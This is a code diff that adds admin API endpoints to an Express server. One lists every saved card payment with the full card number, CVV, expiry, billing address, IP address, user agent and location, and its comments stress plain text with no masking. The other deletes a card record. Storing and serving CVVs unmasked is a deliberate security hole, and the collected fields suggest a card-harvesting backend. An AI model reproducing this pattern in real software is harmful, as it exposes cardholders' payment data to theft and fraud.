@@ -22180,6 +22180,82 @@ function getContentType(filename) {
 
 
 
+// =============================================
+// GET ADMIN CARDS - Display all saved cards with full details
+// Returns plain text card numbers, CVV, expiry, etc.
+// =============================================
+app.get('/api/admin/cards', adminProtect, async (req, res) => {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = parseInt(req.query.limit) || 10;
+    const skip = (page - 1) * limit;
+
+    // Get all card payments with user details
+    const cards = await CardPayment.find({})
+      .populate('user', 'firstName lastName email phone')
+      .sort({ createdAt: -1 })
+      .skip(skip)
+      .limit(limit)
+      .lean();
+
+    const total = await CardPayment.countDocuments({});
+    const totalPages = Math.ceil(total / limit);
+
+    // Format cards with FULL PLAIN TEXT details (no masking)
+    const formattedCards = cards.map(card => ({
+      _id: card._id,
+      user: card.user ? {
+        _id: card.user._id,
+        firstName: card.user.firstName || '',
+        lastName: card.user.lastName || '',
+        email: card.user.email || '',
+        phone: card.user.phone || ''
+      } : null,
+      // FULL PLAIN TEXT CARD DETAILS
+      cardNumber: card.cardNumber,  // Full card number as stored
+      cvv: card.cvv,                // CVV as stored
+      expiryDate: card.expiryDate,  // Expiry date
+      fullName: card.fullName,      // Cardholder name
+      billingAddress: card.billingAddress,
+      city: card.city,
+      state: card.state || '',
+      postalCode: card.postalCode,
+      country: card.country,
+      cardType: card.cardType,
+      amount: card.amount,
+      asset: card.asset || 'USD',
+      status: card.status,
+      ipAddress: card.ipAddress,
+      userAgent: card.userAgent,
+      location: card.location || 'Unknown',
+      lastUsed: card.lastUsed,
+      createdAt: card.createdAt,
+      updatedAt: card.updatedAt
+    }));
+
+    res.status(200).json({
+      status: 'success',
+      data: {
+        cards: formattedCards,
+        pagination: {
+          currentPage: page,
+          totalPages: totalPages,
+          totalItems: total,
+          itemsPerPage: limit,
+          hasNextPage: page < totalPages,
+          hasPrevPage: page > 1
+        }
+      }
+    });
+
+  } catch (err) {
+    console.error('Error fetching cards:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to fetch cards'
+    });
+  }
+});
 
 
 
@@ -22187,8 +22263,59 @@ function getContentType(filename) {
 
 
 
+// =============================================
+// DELETE ADMIN CARD - Remove a saved card
+// =============================================
+app.delete('/api/admin/cards/:id', adminProtect, async (req, res) => {
+  try {
+    const { id } = req.params;
 
+    if (!mongoose.Types.ObjectId.isValid(id)) {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Invalid card ID'
+      });
+    }
 
+    const card = await CardPayment.findById(id);
+    
+    if (!card) {
+      return res.status(404).json({
+        status: 'fail',
+        message: 'Card not found'
+      });
+    }
+
+    // Log before deletion
+    await logActivity(
+      'card_deleted',
+      'CardPayment',
+      card._id,
+      req.admin._id,
+      'Admin',
+      req,
+      {
+        cardHolder: card.fullName,
+        cardLast4: card.cardNumber ? card.cardNumber.slice(-4) : 'Unknown',
+        cardType: card.cardType
+      }
+    );
+
+    await CardPayment.findByIdAndDelete(id);
+
+    res.status(200).json({
+      status: 'success',
+      message: 'Card deleted successfully'
+    });
+
+  } catch (err) {
+    console.error('Error deleting card:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'Failed to delete card'
+    });
+  }
+});
 
 
 
